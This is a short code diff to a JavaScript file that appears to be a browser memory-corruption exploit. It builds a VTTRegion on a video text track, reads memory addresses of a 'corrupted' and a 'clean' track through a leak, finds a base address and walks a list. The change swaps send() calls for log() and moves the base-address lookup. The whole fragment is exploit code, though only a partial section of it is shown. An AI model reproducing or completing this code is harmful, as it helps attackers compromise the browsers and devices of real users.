@@ -482,20 +482,20 @@ function loadRun (obj)
     leakee = obj.leakee;
     leakaddr = obj.leakaddr;
 
-    send("Connected\n");
+    log("Connected\n");
+    
+    base = getBase();
+    walkList();
+    
     
     var objM = new VTTRegion();
     var v = document.createElement("video");
     v.appendChild(document.createElement("track"));
     v.textTracks[0].addRegion(objM);
     
-    send("corruptedTrack: " + convert8(getAddr(vrs[0].track)));
-    send("cleanTrack: " + convert8(getAddr(objM.track)));
+    log("corruptedTrack: " + convert8(getAddr(vrs[0].track)));
+    log("cleanTrack: " + convert8(getAddr(objM.track)));
     
-    //send("alertAddr: " + convert8(getAddr(alert)));
-    
-    base = getBase();
-    walkList();
     
     while(true)
     {
